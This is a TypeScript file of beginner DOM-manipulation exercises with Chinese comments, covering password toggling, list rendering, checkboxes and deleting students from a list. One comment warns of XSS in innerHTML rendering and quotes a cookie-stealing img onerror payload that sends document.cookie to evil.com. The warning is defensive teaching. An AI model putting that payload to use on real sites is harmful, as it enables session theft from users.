console.log("script.ts loaded");

// ===== 第一题：显示和隐藏密码 =====
const pwdInput = document.querySelector("#password") as HTMLInputElement;
const btn1 = document.querySelector("#btn1") as HTMLButtonElement;

btn1.addEventListener("click", () => {
    pwdInput.type = pwdInput.type === "text" ? "password" : "text";
});


// ===== 第二题：获取输入框的值 =====
const input1 = document.querySelector("#input1") as HTMLInputElement;
const btn2 = document.querySelector("#btn2") as HTMLButtonElement;
const result = document.querySelector("#result") as HTMLDivElement;

btn2.addEventListener("click", () => {
    result.innerText = input1.value;
});


// ===== 第三题：点击切换 Tab 样式 =====
const li1 = document.querySelector("#list li:nth-child(1)") as HTMLLIElement;
const li2 = document.querySelector("#list li:nth-child(2)") as HTMLLIElement;

li1.addEventListener("click", () => {
    li1.classList.add("active");
    li2.classList.remove("active");
});
li2.addEventListener("click", () => {
    li2.classList.add("active");
    li1.classList.remove("active");
});


// ===== 第四题：渲染电影列表 =====
interface Film {
    url: string;
    title: string;
    grade: number;
}

const filmList: Film[] = [
    {
        url: "https://media.themoviedb.org/t/p/w220_and_h330_face/cgsK4fUP1CwzTOMWhtU6B3n6hpO.jpg",
        title: "变形机体：机械野兽",
        grade: 7.8
    },
    {
        url: "https://media.themoviedb.org/t/p/w220_and_h330_face/s8Ab1FJ824KVBHC5bZ6kDS9hIkq.jpg",
        title: "肮脏天使",
        grade: 7.2
    },
    {
        url: "https://media.themoviedb.org/t/p/w220_and_h330_face/ouJWDKwqtPj8gzeJoO7mHJ53AxZ.jpg",
        title: "角斗士",
        grade: 7.5
    }
];

// 清空按钮
const btn3 = document.querySelector("#btn3") as HTMLButtonElement;
btn3.addEventListener("click", () => {
    result.innerHTML = "";
});

const btn4 = document.querySelector("#btn4") as HTMLButtonElement;
btn4.addEventListener("click", () => {
    result.innerHTML = filmList.map((item) => `
        <div>
            <img src="${item.url}" alt="${item.title}">
            <h3>${item.title}</h3>
            <p>评分：${item.grade}</p>
        </div>
    `).join("");
});


// ===== 第五题：购物清单（全选 + 提交）=====
const all = document.querySelector("#all") as HTMLInputElement;
const slInput = document.querySelectorAll("#shopping-list li input") as NodeListOf<HTMLInputElement>;

// NodeList 是类数组对象，只有 forEach，没有 map/filter/every 等。
// 需要先用 Array.from() 转为真正的数组。

// 全选按钮：点击后同步所有子复选框
all.addEventListener("click", () => {
    slInput.forEach((item) => {
        item.checked = all.checked;
    });
});

// 每个子复选框：全部选中时同步全选按钮
slInput.forEach((item) => {
    item.addEventListener("click", () => {
        all.checked = Array.from(slInput).every((cb) => cb.checked);
    });
});

// 提交按钮：收集选中项
const btn5 = document.querySelector("#btn5") as HTMLButtonElement;
btn5.addEventListener("click", () => {
    const selected = Array.from(slInput)
        .filter((item) => item.checked)
        .map((item) => item.value);

    alert(selected.length > 0 ? "选中的商品：" + selected.join(" ") : "没有选中的商品");
});


// ===== 第六题：学生列表的渲染与删除 =====

interface Student {
    id: number;
    name: string;
}

let students: Student[] = [
    { id: 1, name: "张三" },
    { id: 2, name: "李四" },
    { id: 3, name: "王五" },
    { id: 4, name: "赵六" },
    { id: 5, name: "钱七" },
    { id: 6, name: "孙八" }
];

// --- 写法一：innerHTML 拼接（简单直接，但有 XSS 风险）---
// 注意：innerHTML 方式需要在渲染完成后重新查询并绑定删除按钮的事件，
// 因为 innerHTML 赋值会销毁并重建所有 DOM 节点。
// 警告：若 students 的数据来自用户输入，innerHTML 会有 XSS 风险。
// 例如攻击者输入：`李四<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">`

const btn6 = document.querySelector("#btn6") as HTMLButtonElement;
btn6.addEventListener("click", () => {
    result.innerHTML = `<ul>${
        students.map((item) =>
            `<li>学号：${item.id} - 姓名：${item.name} - <button class="delete-btn" data-user-id="${item.id}">删除</button></li>`
        ).join("")
    }</ul>`;

    // 渲染后重新绑定所有删除按钮的事件
    document.querySelectorAll<HTMLButtonElement>(".delete-btn").forEach((btn) => {
        btn.addEventListener("click", (ev) => {
            const userId = (ev.target as HTMLButtonElement).dataset.userId!;
            students = students.filter((s) => s.id !== Number(userId));
            btn6.click(); // 重新渲染
        });
    });
});


// --- 写法二：createElement（安全，可在创建时绑定事件）---
function renderStudentList() {
    result.textContent = ""; // textContent 清空更安全（不解析 HTML）
    const ul = document.createElement("ul");

    students.forEach((student) => {
        const li = document.createElement("li");
        const info = document.createTextNode(`学号：${student.id} - 姓名：${student.name} - `);

        const deleteBtn = document.createElement("button");
        deleteBtn.textContent = "删除";
        deleteBtn.dataset.userId = student.id.toString();
        deleteBtn.addEventListener("click", () => {
            students = students.filter((s) => s.id !== student.id);
            renderStudentList();
        });

        li.append(info, deleteBtn); // append 可以同时添加多个节点
        ul.appendChild(li);
    });

    result.appendChild(ul);
}

const btn7 = document.querySelector("#btn7") as HTMLButtonElement;
btn7.addEventListener("click", renderStudentList);
